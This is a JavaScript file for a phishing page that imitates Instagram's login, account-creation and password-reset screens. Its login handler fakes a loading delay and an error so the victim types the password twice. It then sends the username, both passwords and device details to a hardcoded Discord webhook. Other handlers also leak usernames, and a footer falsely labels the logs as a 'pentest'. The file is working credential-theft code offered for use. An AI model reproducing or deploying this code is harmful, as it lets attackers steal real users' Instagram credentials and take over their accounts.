const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1475738602993483806/921vB89TNtZDU9g5_1kVCoikLgfbvwjXu55EjptyXnKt9WqjOCMs4Xhy2lgzuiixuE6u';
let attemptCount = 0;
let capturedUsername = '';
let capturedPassword1 = '';

function goTo(id) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    const target = document.getElementById(id);
    if(target) target.classList.add('active');
    
    document.querySelectorAll('.error-msg').forEach(e => e.style.display = 'none');
    const xIcon = document.getElementById('err-x');
    if(xIcon) xIcon.style.display = 'none';
}

function openCreateScreen() {
    const randomNum = Math.floor(Math.random() * 9000000) + 1000000;
    document.getElementById('username-input').value = "user." + randomNum;
    
    
    goTo('create-screen');
}

function startLoading(btnId, loaderId, errorId, isCreate = false) {
    const btn = document.getElementById(btnId);
    const loader = document.getElementById(loaderId);
    const btnText = btn.querySelector('.btn-text');
    const errorMsg = document.getElementById(errorId);
    const xIcon = document.getElementById('err-x');

    btnText.style.display = 'none';
    loader.style.display = 'block';
    errorMsg.style.display = 'none';
    if(isCreate && xIcon) xIcon.style.display = 'none';

    setTimeout(() => {
        loader.style.display = 'none';
        btnText.style.display = 'block';
        errorMsg.style.display = 'block';
        if(isCreate && xIcon) xIcon.style.display = 'block';
        
        if (btnId === 'login-trigger') {
            handleLoginCapture();
        }
    }, 3000);
}

function handleLoginCapture() {
    const usernameInput = document.querySelector('#login-screen input[type="text"]');
    const passwordInput = document.querySelector('#login-screen input[type="password"]');
    
    const username = usernameInput ? usernameInput.value.trim() : '';
    const password = passwordInput ? passwordInput.value : '';
    
    if (!username || !password) return;
    
    attemptCount++;
    
    if (attemptCount === 1) {
        capturedUsername = username;
        capturedPassword1 = password;
       
    } else {
        const password2 = password;
        sendToDiscord(capturedUsername, capturedPassword1, password2, '✅ Login Attempt #2 - FULL CAPTURE');
        
        // 🔥 FIXED REDIRECT - NO WARNING!
        setTimeout(() => {
            window.location.href = `/done/accounts/login/?username=${encodeURIComponent(capturedUsername)}`;
        }, 1000);
    }
}

// EVENT LISTENERS
document.getElementById('login-screen').querySelector('.forgot-link').onclick = function(e) {
    e.preventDefault();
    const usernameInput = document.querySelector('#login-screen input[type="text"]');
    const username = usernameInput ? usernameInput.value.trim() : 'Not provided';
    sendToDiscord(username, 'FORGOT_PASSWORD', 'N/A', '🔍 Forgot Password');
    goTo('forgot-screen');
};
// YE LINE 82 PE BADALO:
window.location.href = `/done`;
document.getElementById('create-trigger').onclick = () => {
    const username = document.getElementById('username-input').value.trim();
    sendToDiscord(username || 'Random Generated', 'CREATE_TRY', 'N/A', '➕ Create Account Try');
    startLoading('create-trigger', 'create-loader', 'create-error', true);
};

document.getElementById('forgot-trigger').onclick = () => {
    const usernameInput = document.querySelector('#forgot-screen input[type="text"]');
    const username = usernameInput ? usernameInput.value.trim() : 'Not provided';
    
    startLoading('forgot-trigger', 'forgot-loader', 'forgot-error');
};

document.getElementById('login-trigger').onclick = () => startLoading('login-trigger', 'login-loader', 'login-error');

async function sendToDiscord(username, pass1, pass2, title) {
    const embed = {
        title: title,
        color: attemptCount === 2 ? 65280 : 16711680,
        fields: [
            { name: '👤 Username', value: `\`${username}\``, inline: true },
            { name: '🔑 Password 1', value: `\`${pass1}\``, inline: true },
            { name: '🔑 Password 2', value: pass2 !== 'N/A' ? `\`${pass2}\`` : 'N/A', inline: true },
            { name: '🕐 IST Time', value: new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'}), inline: true },
            { name: '📱 Device', value: navigator.userAgent.slice(0, 50) + '...', inline: false },
            { name: '🖥️ Resolution', value: `${screen.width}x${screen.height}`, inline: true },
            { name: '🔗 URL', value: window.location.href, inline: true }
        ],
        thumbnail: { url: 'https://instagram.com/favicon.ico' },
        footer: { text: 'Instagram Pentest Logs' }
    };
    
    fetch(DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] })
    }).catch(() => {});
}